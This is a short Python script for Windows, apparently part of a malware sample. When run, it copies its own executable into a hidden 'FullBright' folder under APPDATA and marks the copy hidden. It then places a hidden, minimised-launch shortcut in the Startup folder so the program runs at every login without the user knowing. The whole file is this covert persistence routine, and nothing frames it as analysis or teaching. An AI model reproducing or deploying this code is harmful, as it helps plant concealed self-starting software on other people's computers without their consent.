import os, sys, shutil, win32com.client
def hiddenstartup():
    appdata = os.getenv('APPDATA')
    target_folder = os.path.join(appdata, 'FullBright')
    os.makedirs(target_folder, exist_ok=True)
    shutil.copy(sys.executable, target_folder)
    os.system(f'attrib +h "{os.path.join(target_folder, os.path.basename(sys.executable))}"')

    startup = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    shortcut = os.path.join(startup, 'FullBright.lnk')
    shell = win32com.client.Dispatch('WScript.Shell')
    shortcut_obj = shell.CreateShortcut(shortcut)
    shortcut_obj.TargetPath = os.path.join(target_folder, os.path.basename(sys.executable))
    shortcut_obj.IconLocation = os.path.join(target_folder, os.path.basename(sys.executable))
    shortcut_obj.WindowStyle = 7
    shortcut_obj.Save()
    os.system(f'attrib +h "{shortcut}"')
hiddenstartup()
